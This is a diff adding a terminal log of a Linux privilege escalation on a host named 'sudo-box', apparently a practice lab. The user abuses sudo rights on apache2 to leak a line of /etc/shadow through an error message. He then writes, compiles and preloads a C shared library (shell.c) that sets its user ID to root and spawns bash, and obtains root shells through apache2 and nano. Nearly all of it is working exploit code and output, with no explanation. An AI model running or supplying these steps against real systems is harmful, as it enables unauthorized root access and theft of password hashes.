@@ -1,0 +1,45 @@
+john@sudo-box:~$ sudo apache2 -f /etc/shadow 
+AH00534: apache2: Configuration error: No MPM loaded.
+
+john@sudo-box:~$ sudo apache2 -f /etc/shadow -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" 
+AH00526: Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:*:18561:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+
+john@sudo-box:~$ sudo -l
+Matching Defaults entries for john on sudo-box:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    env_keep+=LD_PRELOAD
+
+User john may run the following commands on sudo-box:
+    (ALL) NOPASSWD: /usr/bin/nano
+    (ALL) NOPASSWD: /usr/sbin/apache2
+
+
+shell.c "#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+"
+
+
+john@sudo-box:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles 
+
+
+john@sudo-box:~$ sudo LD_PRELOAD=/home/john/shell.so apache2 
+root@sudo-box:/home/john# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+john@sudo-box:~$ sudo LD_PRELOAD=/home/john/shell.so nano
+root@sudo-box:/home/john# id
+uid=0(root) gid=0(root) groups=0(root)
+
